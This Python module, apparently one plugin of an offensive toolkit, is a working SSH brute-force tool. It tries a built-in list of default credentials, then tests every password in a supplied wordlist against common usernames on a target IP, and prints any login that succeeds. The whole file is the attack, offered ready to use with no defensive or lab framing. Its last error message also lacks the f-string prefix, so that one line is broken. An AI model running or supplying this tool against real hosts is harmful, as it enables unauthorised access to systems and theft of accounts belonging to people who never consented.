import paramiko
import time
import os
from assets.wordlist.userpass import DEFAULT_CREDS, COMMON_USERS
from app.utility.colors import C

REQUIRED_OPTIONS = {"IP": "", "PASS": ""}


def test_ssh(target_ip, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            target_ip,
            port=int(port),
            username=username,
            password=password,
            timeout=3,
            banner_timeout=3,
            allow_agent=False,
            look_for_keys=False,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        time.sleep(1)
        return False
    except Exception:
        return False
    finally:
        client.close()


def execute(options):
    target_ip = options.get("IP")
    wordlist_path = options.get("PASS")

    port = 22
    print(f"{C.HEADER}  --- SSH BRUTE FORCE: {target_ip} ---")

    try:
        # Stage 1: Kredensial Default
        print(f"{C.MENU}  [*] Starting stage 1: Kredensial Default...")
        for user, passwd in DEFAULT_CREDS:
            if test_ssh(target_ip, port, user, passwd):
                print(f"{C.SUCCESS}  [✓] LOGIN SUCCESS! -> U:{user} P:{passwd}")
                return
            print(f"{C.MENU}  [-] Fail: {user}:{passwd}")

        # Stage 2: Wordlist
        if wordlist_path and os.path.exists(wordlist_path):
            print(f"\n{C.MENU}  [*] Starting stage 2: Wordlist...")
            with open(wordlist_path, "r", encoding="latin-1") as f:
                for target_user in COMMON_USERS:
                    f.seek(0)
                    for line in f:
                        passwd = line.strip()
                        if not passwd:
                            continue
                        if test_ssh(target_ip, port, target_user, passwd):
                            print(
                                f"{C.SUCCESS}  [✓] LOGIN SUCCESS! -> U:{target_user} P:{passwd}"
                            )
                            return
                        print(
                            f"{C.MENU}  [>] Try: U:{target_user:<20} P:{passwd:<20}",
                            end="\r",
                            flush=True,
                        )

    except KeyboardInterrupt:
        return
    except Exception as e:
        print("{C.ERROR}[x] ERROR: {e}")
